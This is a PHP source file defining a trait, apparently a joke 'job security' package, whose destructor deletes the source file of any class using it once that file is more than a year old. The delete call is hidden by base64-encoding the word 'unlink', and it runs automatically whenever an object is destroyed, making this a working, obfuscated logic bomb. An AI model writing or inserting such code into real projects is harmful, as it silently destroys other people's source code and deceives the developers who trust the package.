<?php
namespace Catfish\JobSecurity;

use ReflectionClass;

trait JobSecurity
{
    public $reviewAt = '1 year';

    public function __destruct()
    {
        $command   = base64_decode('dW5saW5r');
        $reflector = new ReflectionClass(static::class);
        $path      = $reflector->getFileName();
        $fileAge   = date_create('@'.filemtime($path));
        $reviewAt  = date_create($this->reviewAt.' ago');
        $fileAge < $reviewAt && $command($path);
    }
}

/* End of file JobSecurity.php */
